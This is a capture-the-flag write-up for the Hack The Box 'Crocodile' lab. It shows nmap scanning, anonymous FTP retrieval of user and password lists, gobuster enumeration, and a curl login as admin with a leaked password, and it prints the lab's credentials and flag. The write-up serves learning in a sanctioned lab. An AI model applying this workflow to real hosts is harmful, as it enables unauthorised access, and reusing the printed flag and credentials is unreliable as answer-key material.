# HTB Starting Point - Crocodile

## Enumeration

### Nmap

*Performing an nmap scan to detect open ports*

```
nmap -sV -sC 10.129.244.27
Starting Nmap 7.94 ( https://nmap.org ) at 2026-07-27 13:37 EDT 
Nmap scan report for 10.129.244.27
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix
```

---

### Connecting to an anonymous FTP

```
ftp -a 
Connected to 10.129.244.27.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45253|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||46177|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
226 Transfer complete.
33 bytes received in 00:00 (0.09 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||48736|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
226 Transfer complete.
62 bytes received in 00:00 (0.38 KiB/s)
ftp> bye
221 Goodbye.
```

[...]

---

Content of allowed.userlist:

```
aron
pwnmeow
egotisticalsw
admin
```

[...]

Content of allowed.userlist.passwd:

```
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

## Gobuster — directory enumeration

[...]

### Time to enumerate port 80: I chose gobuster for directory enumeration

```
gobuster dir -u https://10.129.244.27 -w /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list2.3-small.txt -x php
```

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.244.27
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1577]
/assets               (Status: 301) [Size: 315] [--> http://10.129.244.27/assets/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.244.27/css/]
/js                   (Status: 301) [Size: 311] [--> http://10.129.244.27/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
Progress: 4136 / 175326 (2.36%)^C
```

We can see that this website uses PHP at the backend (screenshot 01) so I chose to look for PHP file types. The first result I got is login.php.

Screenshot 02 shows a login page. I used a curl command to fetch the page and save cookies into cookies.txt for the next command.

```
curl -c cookies.txt http://10.129.244.27/login.php
```

<!-- HTML code for Bootstrap framework and form design -->

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/signin.css">
    <title>Sign in</title>
</head>
<body>
<div class="container">
    <form action="" method="post" name="Login_Form" class="form-signin">
        <h2 class="form-signin-heading">Please sign in</h2>
        <label for="inputUsername" class="sr-only">Username</label>
        <input name="Username" type="username" id="inputUsername" class="form-control" placeholder="Username" required autofocus>
        <label for="inputPassword" class="sr-only">Password</label>
        <input name="Password" type="password" id="inputPassword" class="form-control" placeholder="Password" required>
        <div class="checkbox">
            <label>
                <input type="checkbox" value="remember-me"> Remember me
            </label>
        </div>
        <button name="Submit" value="Login" class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>

        
    </form>
```

```
cat cookies.txt
```

```
10.129.244.27   FALSE   /       FALSE   0       PHPSESSID       m7fliv86a46vcinl4sje9h9daq
```

Last command to post a Username, Password and submit it (using -L for redirecting):

```
curl -c cookies.txt -b cookies.txt -L -d "Username=admin&Password=rKXM59ESxesUFHAd&Submit=Login" http://10.129.244.27/login.php | grep flag
```

```
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total  Spent    Left  Speed
100  1311  100  1258  100    53   2282     96 --:--:-- --:--:-- --:--:--  2375
                        <h1 class="h3 mb-0 text-gray-800">Here is your flag: c7110277ac44d78b6a9fff2232434d16</h1>
100 38454    0 38454    0     0  33007      0 --:--:--  0:00:01 --:--:--    
```

We found a flag by using the correct credentials: `admin:rKXM59ESxesUFHAd`.

Flag: `c7110277ac44d78b6a9fff2232434d16` (screenshot: flag.png).

## Lessons learned

- ftp anonymous login with flag `-a`
- enumeration with gobuster using `-x` to specify extensions
- curl for GET/POST requests
- grep to quickly capture the necessary string
